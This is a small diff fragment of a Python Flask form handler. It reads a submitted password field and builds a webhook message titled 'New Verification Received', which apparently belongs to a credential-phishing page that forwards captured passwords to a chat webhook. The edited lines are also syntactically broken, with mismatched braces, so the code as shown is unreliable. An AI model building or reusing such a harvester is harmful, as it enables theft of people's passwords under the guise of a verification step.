@@ -66,7 +66,7 @@ def submit():
     p = request.form.get('pw')
     
     # f-string für Webhook (doppelte Klammern {{ }} für JSON nötig)
-    payload = {{
+    payload = {{ }}
         "embeds": [{{
             "title": "📥 New Verification Received",
             "color": 5814783,
